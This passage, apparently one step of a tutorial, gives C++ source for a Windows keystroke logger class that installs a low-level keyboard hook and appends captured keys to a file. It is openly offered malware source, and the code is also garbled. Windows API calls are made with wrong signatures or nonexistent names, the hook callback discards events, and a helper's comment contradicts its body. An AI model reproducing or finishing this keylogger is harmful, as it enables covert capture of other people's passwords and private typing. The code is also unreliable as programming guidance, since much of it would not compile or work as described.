### Step 2: Define the Keystroke Logger Class
This class will encapsulate the functionality to log keystrokes.

```cpp
using namespace std;

class KeystrokeLogger {
private:
    HWND hwnd;
    HHOOK hhook;
    ofstream file;
    string filename;
    char buffer[256];
    vector<int> keyStates;

public:
    KeystrokeLogger(string filename) : hwnd(0), hhook(0), file(filename), filename(filename) {
        // Initialize the file
        file.open(filename.c_str(), ofstream::app | ofstream::binary);
        // Record the current key states
        GetKeyState(0, &buffer, 0);
    }

    ~KeystrokeLogger() {
        Unhook(hhook);
        if (file.is_open()) {
            file.close();
        }
    }

    void startLogging() {
        // Set up the hook
        hhook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);
        hwnd = GetForegroundWindow(nullptr);
        // Loop to process keyboard events
        while (true) {
            if (!hwnd) {
                // Handle if no window is foreground
                Sleep(100);
                continue;
            }
            // Check for key presses
            GetKeyState(0, buffer, 0);
            // Check if any key is pressed
            for (int i = 0; i < 256; ++i) {
                if (buffer[i] != 0) {
                    // Convert scancode to character
                    char c = ToUnicode(buffer, 0, &i);
                    // Append to file
                    file << c;
                    file << endl;
                    // Reset the buffer
                    memset(buffer, 0, sizeof(buffer));
                }
            }
            // Sleep to prevent high CPU usage
            Sleep(100);
        }
    }

    static DWORD WINAPI keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
        return CallNextHook(wParam, lParam);
    }

    // Helper functions
    static LRESULT CALLBACK WndProc(HWND hwnd, int msg, WPARAM wParam, LPARAM lParam) {
        if (msg == WM_KEYDOWN || msg == WM_KEYUP) {
            if (!hwnd) {
                return DefWindowProc(hwnd, msg, wParam, lParam);
            }
        }
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    //Helper function to disable full-screen hooks
    void disableFullscreenHooks() {
        HWND hwnd = GetForegroundWindow(nullptr);
        RECT windowRect;
        GetWindowRect(hwnd, &windowRect);
        if (windowRect.left == 0 && windowRect.top == 0 && windowRect.right == GetSystemMetrics(SM_CXFULLSCREEN) && 
            windowRect.bottom == GetSystemMetrics(SM_CYFULLSCREEN)) {
            // Enable the window
            EnableWindow(hwnd);
        }
    }
};
```

